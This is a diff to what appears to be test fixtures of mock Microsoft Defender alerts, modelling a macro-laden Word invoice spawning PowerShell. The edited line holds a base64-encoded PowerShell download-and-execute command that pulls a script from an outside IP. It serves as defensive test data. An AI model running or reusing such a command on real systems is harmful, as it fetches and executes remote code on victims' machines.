@@ -117,7 +117,7 @@ MOCK_DEFENDER_ALERTS: List[Dict[str, Any]] = [
             },
             {
                 "@odata.type": "#microsoft.graph.security.processEvidence",
-                "processCommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAyAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+                "processCommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAyAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
                 "parentProcessCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\john.smith\\Downloads\\Invoice_October_Q3.docm\"",
                 "processCreationDateTime": (now - timedelta(minutes=57)).isoformat(),
                 "processId": 6720,
